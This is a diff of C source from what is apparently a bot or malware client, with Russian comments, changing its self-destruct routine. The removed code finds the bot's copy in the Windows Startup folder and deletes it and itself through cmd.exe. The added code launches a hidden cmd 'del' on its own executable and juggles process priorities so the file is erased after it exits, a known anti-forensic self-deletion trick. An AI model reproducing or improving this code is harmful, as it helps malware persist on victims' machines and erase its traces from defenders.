@@ -51,53 +51,31 @@ static void send_error(wchar_t* botId, char* id_command, uint32_t castom_error, 
 }
 
 void do_destroy() {
+	wchar_t path_newbot[1024];
+	wchar_t path_bot[1024];
+	wchar_t cmdParametrs[MAX_PATH];
 
-	char str_autorun[1024];
-	char path_bot[1024];
-	char username[1024];
-	char name_bot[1024];
-	char temp_str[1024];
-	char str_to_system[1024];
-	char* p_str = NULL;
-
-	DWORD bufCharCount = sizeof(username);
-
-	//Определение полного пути до запущенного бота
-	GetModuleFileNameA(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
-	strncpy((char*)temp_str, (char*)path_bot, sizeof(path_bot));
-
-	//Определение имени запущенного бота
-	p_str = strtok(temp_str, "\\");
-	while (p_str != NULL) {
-		strncpy((char*)name_bot, (char*)p_str, sizeof(name_bot));
-		p_str = strtok(NULL, "\\");
-	}
-
-	//Определение пути до автозагрузки
-	GetUserNameA(username, &bufCharCount);
-	sprintf(str_autorun, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", username, name_bot);
-
-	//Проверка от куда запущен бот
-	if (!strcmp(str_autorun, path_bot)) {
-		//Бот запущен из автозагрузки, удаление бота из автозагрузки
-		sprintf(str_to_system, "/c ping 127.0.0.1 && DEL /F /S /Q /A \"%s\"", path_bot);
-		DEBUG_TO_FILE("+++ str_to_system: %s \r\n", str_to_system);
-		ShellExecuteA(NULL, "open", "cmd.exe", str_to_system, NULL, SW_SHOWNORMAL);
+	GetModuleFileNameW(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
+	SHELLEXECUTEINFO sei;
+	wchar_t cmd_path[MAX_PATH];
+	GetEnvironmentVariableW(L"COMSPEC", cmd_path, MAX_PATH);
+	wsprintfW(cmdParametrs, L"/c del %ls > nul", path_bot);
+	sei.cbSize = sizeof(sei);
+	sei.hwnd = 0;
+	sei.lpVerb = L"Open";
+	sei.lpFile = cmd_path;
+	sei.lpParameters = cmdParametrs;
+	sei.lpDirectory = 0;
+	sei.nShow = SW_HIDE;
+	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+	if (ShellExecuteEx(&sei))
+	{
+		SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
+		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
+		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
+		SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, path_bot, 0);
 		ExitProcess(0);
-	}
-	else {
-		//Бот запущен не из автозагрузки, удаление бота из автозагрузки и удаление себя
-		sprintf(str_to_system, "DEL /F /S /Q /A \"%s\"", str_autorun);
-		system(str_to_system);
-
-		//Удалим себя
-		sprintf(str_to_system, "/c ping 127.0.0.1 && DEL /F /S /Q /A \"%s\"", path_bot);
-		DEBUG_TO_FILE("+++ str_to_system: %s \r\n", str_to_system);
-		ShellExecuteA(NULL, "open", "cmd.exe", str_to_system, NULL, SW_SHOWNORMAL);
-		ExitProcess(0);
-	}
-
-	return;
+	}	
 }
 
 int parse_task_and_exec(wchar_t* botId, char* DecResponse) {
